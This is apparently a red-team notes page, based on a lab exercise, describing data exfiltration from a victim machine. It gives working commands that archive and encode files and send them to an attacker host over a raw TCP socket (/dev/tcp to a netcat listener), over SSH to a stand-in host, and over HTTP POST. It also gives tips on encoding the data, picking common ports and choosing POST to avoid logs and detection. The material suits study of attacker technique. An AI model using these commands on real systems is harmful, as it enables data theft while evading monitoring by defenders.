# Data Exfiltration

### Exfil using a TCP socket

* Good for when you know there are no network based security products&#x20;
* This is NOT recommending in a network that is well secured
* This is easy to detect because we are using anon standard protocols&#x20;

<figure><img src="../.gitbook/assets/9931b598f5757bbdfb74004a2a43fe16.png" alt=""><figcaption></figcaption></figure>

* This shows the two hosts communicating over port 1337&#x20;
* In the real world please pick a normal port like 443 or 80, 8080, 8443 etc, etc
* The first machine listens on 1337&#x20;
* The other machine connects to `1.2.3.4:1337`&#x20;
* The first machine establishes the connection&#x20;
* Finally you can now send and receive data&#x20;

#### Set up your listener on the attack machines&#x20;

```
nc -lvp 8080 > /tmp/task4-creds.data
Listening on [0.0.0.0] (family 0, port 8080)
```

* Now on the victim to exfil the data

```
thm@victim1:$ tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
0+1 records in
0+1 records out
260 bytes copied, 9.8717e-05 s, 2.6 MB/s
```

* Note that we used the Base64 and EBCDIC encoding to protect the data during the exfiltration. If someone inspects the traffic, it would be in a non-human readable format and wouldn't reveal the transmitted file type.

```
ls -l /tmp/
-rw-r--r-- 1 root root       240 Apr  8 11:37 task4-creds.data
```

* On the attack box, we need to convert the received data back to its original status. We will be using the dd tool to convert it back.&#x20;

```
dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar
tar xvf task4-creds.tar
task4/ 
task4/creds.txt
```

### Exfiltration using SSH

* SSH protocol establishes a secure channel to interact and move data between the client and server, so all transmission data is encrypted over the network or the Internet.

<figure><img src="../.gitbook/assets/aa723bb0e2c39dfc936b135c4912d1cf.png" alt=""><figcaption></figcaption></figure>

* To transfer data over the SSH, we can use either the Secure Copy Protocol SCP or the SSH client.
* Lets assume `scp` is not on the target machine
* From the victim machine&#x20;
* `jump.example.com` is the attacker machine&#x20;

```
tar cf - task5/ | ssh user@jump.example.com "cd /tmp/; tar xpf -"
```

1. We used the tar command the same as the previous task to create an archive file of the task5 directory.
2. Then we passed the archived file over the ssh. SSH clients provide a way to execute a single command without having a full session.
3. We passed the command that must be executed in double quotations, "cd /tmp/; tar xpf. In this case, we change the directory and unarchive the passed file.

* This one line command will push directories or files from the victim machine
* This is a disaster for logging
* Each time you do this will log on the victim machine with the ip of your attacker machine
* Use with extreme caution!!!!

### HTTP POST Request

* Exfiltration data through the HTTP(s) protocol is one of the best options because it is challenging to detect. It is tough to distinguish between legitimate and malicious HTTP traffic.&#x20;
* We will use the POST HTTP method in the data exfiltration, and the reason is with the GET request, all parameters are registered into the log file.&#x20;
* While using POST request, it doesn't. The following are some of the POST method benefits:
* POST requests are never cached
* POST requests do not remain in the browser history
* POST requests cannot be bookmarked
* POST requests have no restrictions on data length

#### Example Apache Log

* Take a look at the different web logs
* The POST contains way less about our activities&#x20;

```
10.10.198.13 - - [22/Apr/2022:12:03:11 +0100] "GET /example.php?file=dGhtOnRyeWhhY2ttZQo= HTTP/1.1" 200 147 "-" "curl/7.68.0"
10.10.198.13 - - [22/Apr/2022:12:03:25 +0100] "POST /example.php HTTP/1.1" 200 147 "-" "curl/7.68.0"
```

